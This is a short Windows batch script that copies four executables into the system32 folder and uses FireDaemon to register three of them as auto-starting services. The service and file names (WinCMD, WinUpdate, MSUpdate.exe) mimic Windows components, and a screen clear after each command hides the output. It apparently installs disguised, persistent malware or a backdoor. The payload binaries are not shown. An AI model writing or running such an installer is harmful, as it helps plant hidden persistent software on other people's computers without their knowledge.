move service.exe %WINDIR%\system32
@cls
move firedaemon.exe %WINDIR%\system32
@cls
move WinCMD.exe %WINDIR%\system32
@cls
move MSUpdate.exe %WINDIR%\system32
@cls
cd %WINDIR%\system32
@cls
set MXBIN=%WINDIR%\system32
@cls
net stop SERVICE
@cls
firedaemon -u SERVICE
@cls
firedaemon -i SERVICE %WINDIR%\system32 %WINDIR%\system32\SERVICE.EXE "" Y 0 0 N Y
@cls
net start SERVICE
@cls
net stop WinCMD
@cls
firedaemon -u WinCMD
@cls
firedaemon -i WinCMD %WINDIR%\system32 %WINDIR%\system32\WinCMD.exe "" Y 0 0 N Y
@cls
net start WinCMD
@cls
net stop WinUpdate
@cls
firedaemon -u WinUpdate
@cls
firedaemon -i WinUpdate %WINDIR%\system32 %WINDIR%\system32\MSUpdate.exe "" Y 0 0 N Y
@cls
net start WinUpdate